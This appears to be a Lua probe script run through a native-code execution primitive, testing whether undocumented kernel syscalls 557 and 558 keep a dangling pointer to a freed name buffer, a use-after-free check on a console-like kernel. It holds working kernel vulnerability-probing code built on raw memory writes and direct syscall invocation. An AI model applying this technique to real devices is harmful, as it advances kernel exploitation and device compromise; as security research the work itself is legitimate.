-- CRASH_CLASS: HIGH
-- PROBE 557b: is the name pointer copied, or stored?
--
-- 557a established: 557(ptr, flags, 0, 0) creates a named object and returns a
-- handle from the shared table (slot | generation << 12); 558(handle) with one
-- argument deletes it; every other 558 shape is -1. The first argument must be
-- a readable pointer (557(0, ...) is -1), and a zeroed 0x200-byte struct works
-- as an empty name, so the string sits at offset 0 of whatever it points to.
--
-- That leaves the lifetime question. If 557 copies the string, the caller's
-- buffer can be freed immediately. If it stores the pointer, the object holds
-- a dangling reference that a second create (duplicate-name lookup) or the
-- delete itself would dereference.
--
-- Order matters: the free happens first, then the uses, so a fault is
-- attributable. The delete goes last because a fault there ends the process.

print("=== PROBE 557b: name pointer lifetime ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rb(a) local o,v=pcall(function() return memory.read_byte(a) end); if o then return to_num(v) end end
local function call(f,...)
    local ok,rv=pcall(f,...)
    if not ok then return -999 end
    return to_num(rv)
end
local function mmap(px, prot, flags)
    local _, a = pcall(function()
        return mk(477)(uint64(0), uint64(px), uint64(prot or 3), uint64(flags or 0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local function str_at(addr, s)
    for i = 1, #s do wb(addr + i - 1, string.byte(s, i)) end
    wb(addr + #s, 0)
end

print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))

local PAGE = 0x4000
local p = mmap(PAGE)
local q = mmap(PAGE)
if p == 0 or q == 0 then print("[!] mmap failed"); return end
print(string.format("[1] pages p=%X q=%X", p, q))

--------------------------------------------------------------------
-- 1: create with the name in page p
--------------------------------------------------------------------
str_at(p, "uafname557")
print(string.format("[2] p holds '%c%c%c%c'", rb(p) or 0, rb(p+1) or 0, rb(p+2) or 0, rb(p+3) or 0))
local h1 = call(mk(557), uint64(p), uint64(0), uint64(0), uint64(0))
print("[2] 557(p) ret=" .. h1 .. string.format(" (0x%X)", h1 % 4294967296))
if h1 <= 0 then print("[!] create failed - nothing to test"); return end

--------------------------------------------------------------------
-- 2: free the page the object may still point at
--------------------------------------------------------------------
local rv_unmap = call(mk(73), uint64(p), uint64(PAGE))
print("[3] munmap(p) ret=" .. rv_unmap)
print("    p readable? " .. tostring(rb(p)))

--------------------------------------------------------------------
-- 3: create a second object with the same name from a live page
--------------------------------------------------------------------
str_at(q, "uafname557")
print("[4] q holds the same name; creating again")
local h2 = call(mk(557), uint64(q), uint64(0), uint64(0), uint64(0))
print("[4] 557(q) ret=" .. h2 .. " (alive, duplicate name accepted)")
print("")

--------------------------------------------------------------------
-- 4: does the delete walk the (freed) name?
--------------------------------------------------------------------
print("[5] deleting the object whose name page is gone: 558(" .. h1 .. ")")
local d1 = call(mk(558), uint64(h1))
print("[5] 558(h1) ret=" .. d1)
print("[6] alive=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("[6] deleting the second object: 558(" .. h2 .. ")")
local d2 = call(mk(558), uint64(h2))
print("[6] 558(h2) ret=" .. d2)
print("[Z] alive=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("=== PROBE 557b COMPLETE ===")
